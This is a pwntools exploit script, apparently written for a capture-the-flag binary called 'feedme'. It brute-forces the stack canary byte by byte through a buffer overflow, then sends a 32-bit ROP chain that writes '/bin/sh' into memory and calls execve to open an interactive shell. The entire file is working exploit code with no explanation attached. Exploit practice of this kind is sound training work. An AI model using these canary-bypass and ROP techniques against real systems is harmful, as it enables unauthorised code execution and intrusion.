from pwn import *

inputSize = 0x20


def feed(target, data):
  firstLineStr = bytes([len(data)])
  target.send(firstLineStr)
  target.send(data)


def detectCanaryBytes(target):
  basePayload = b"0" * inputSize
  canaryBytes = b"\x00"
  for _ in range(3):
    for addingChar in range(0x100):
      addingCharBytes = bytes([addingChar])
      payload = basePayload + canaryBytes + addingCharBytes
      feed(target, payload)
      result = target.recvuntil("exit.")
      if b"YUM" in result:
        canaryBytes += addingCharBytes
        break
  return canaryBytes


popEax = p32(0x80bb496)
popEdx = p32(0x806f34a)
PopEcxPopEbx = p32(0x0806f371)
moveFromEdxToEaxAddr = p32(0x807be31)
syscall = p32(0x8049761)  # int 0x80
writeStrAddr = 0x80eb928


target = process("./feedme")

payload = b"0" * inputSize
payload += detectCanaryBytes(target)
payload += b"1" * 0xc

payload += popEax
payload += p32(writeStrAddr)
payload += popEdx
payload += p32(0x6e69622f)
payload += moveFromEdxToEaxAddr

payload += popEax
payload += p32(writeStrAddr + 0x4)
payload += popEdx
payload += p32(0x68732f)
payload += moveFromEdxToEaxAddr

payload += popEax
payload += p32(0xb)
payload += PopEcxPopEbx
payload += p32(0x0)
payload += p32(writeStrAddr)
payload += popEdx
payload += p32(0x0)
payload += syscall

feed(target, payload)
target.interactive()
